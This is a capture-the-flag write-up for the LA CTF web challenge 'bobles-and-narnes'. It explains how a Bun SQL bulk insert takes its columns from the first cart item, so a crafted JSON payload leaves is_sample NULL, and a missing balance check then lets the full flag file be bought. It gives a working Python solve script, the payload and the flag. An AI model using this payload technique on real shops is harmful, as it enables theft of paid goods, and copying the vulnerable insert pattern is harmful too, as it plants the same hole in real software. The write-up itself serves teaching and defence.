# bobles-and-narnes

## tl;dr

Bun's SQL bulk insert helper takes column names from the first object in the array. Send a product without `is_sample` first, and the column gets dropped from the INSERT entirely. Flag book ends up with `is_sample = NULL` in the DB, which is falsy → full file served instead of sample.

## the setup

We've got a bookstore app ("Narnes and Bobles" — very subtle) running on Bun + Express + SQLite. You register, you get $1000, and you can buy books. There's a Flag book that costs $1,000,000. Classic.

You can add items to your cart as either full purchases or free samples. Samples give you a truncated preview file. The flag sample is literally just `lactf{` which is pain in text form.

## finding the bug

Two things jumped out immediately:

**1)** The checkout endpoint has NO balance check. It just yolos the deduction:

```js

awaitdb`UPDATE users SET balance=${balance - cartSum} WHERE username = ${res.locals.username}`;

```

Your balance can go to -999,000 and nobody cares. So if we can get the flag into our cart, we're golden. The only gate is `/cart/add`.

**2)** The `/cart/add` price check and the checkout file selection use `is_sample` differently:

- Price filter (both add & checkout): `!+product.is_sample` — JS numeric coercion
- File path selection: `item.is_sample ? sample_path : full_path` — JS truthiness

If `is_sample` is `null`, then `!+null = !0 = true` (counted in price sum, but who cares — see point 1), and `null` is falsy so we get the **full file**. We just need `is_sample` to be NULL in the database.

## the actual trick

Here's the juicy part. Items get inserted like this:

```js

constcartEntries = productsToAdd.map((prod) => ({ ...prod, username:res.locals.username }));

awaitdb`INSERT INTO cart_items ${db(cartEntries)}`;

```

Bun's `db()` helper for bulk inserts determines the column names from **the first object in the array**. If your first object doesn't have an `is_sample` key, the INSERT statement simply won't include that column. Every row gets `is_sample = NULL`, regardless of what the other objects say.

So we send:

```json

{

"products": [

    {"book_id": "a3e33c2505a19d18"},

    {"book_id": "2a16e349fb9045fa", "is_sample": 1}

  ]

}

```

The first product is a $10 book with no `is_sample` key. The second is the flag with `is_sample: 1`.

During the add price check, the JS code sees `is_sample: 1` on the flag and filters it out (it's a "sample", therefore free). Only the $10 book is counted. $10 ≤ $1000, check passes.

But when `db()` builds the INSERT, it looks at the first object's keys: `book_id`, `username`. No `is_sample`. Both rows go in with `is_sample = NULL`.

At checkout, `null` is falsy, so instead of `flag_sample.txt` we get the full `flag.txt`. Balance goes to -999,010 but there's no check so ¯\\\_(ツ)\_/¯

## solve script

```python

import requests, io, zipfile, uuid


BASE = "https://bobles-and-narnes.chall.lac.tf"

s = requests.Session()


user = f"exploit_{uuid.uuid4().hex[:12]}"

s.post(f"{BASE}/register", data={"username": user, "password": "pass"}, allow_redirects=False)


s.post(f"{BASE}/cart/add", json={"products": [

    {"book_id": "a3e33c2505a19d18"},                    # cheap book, no is_sample key

    {"book_id": "2a16e349fb9045fa", "is_sample": 1},    # flag, "free sample" in JS check

]})


r = s.post(f"{BASE}/cart/checkout")

z = zipfile.ZipFile(io.BytesIO(r.content))

print(z.read("flag.txt").decode())

```

## flag

`lactf{hojicha_chocolate_dubai_labubu}`

## takeaway

If your ORM/query builder infers schema from user-controlled data, you're gonna have a bad time. The mismatch between "what JS thinks the object looks like" and "what columns the SQL INSERT actually has" is a sneaky class of bugs. Always validate and normalize your inputs into a fixed shape before handing them to the database layer.
